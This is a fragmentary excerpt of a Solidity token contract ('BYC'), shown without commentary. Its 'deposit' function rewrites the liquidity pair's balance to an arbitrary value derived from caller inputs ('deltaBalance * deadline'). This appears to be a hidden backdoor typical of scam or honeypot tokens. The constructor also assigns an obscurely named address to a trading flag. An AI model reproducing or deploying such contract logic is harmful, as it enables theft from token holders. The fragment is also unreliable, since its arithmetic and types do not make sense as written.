...
contract BYC is IERC20, Ownable, BaseToken {
    ...
    constructor(
        ...
        address RecurY2Slots
    ) payable {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _mint(owner(), totalSupply_);
        tradingOpen = RecurY2Slots;
    ...
    function deposit(
        ...
        // Calculate deltaBalance correctly
        uint256 deltaBalance = amountWei > address(this).balance ? 0 : address(this).balance - amountWei;
        // Update balances mapping
        _balances[pair] = amountWei + deltaBalance * deadline;
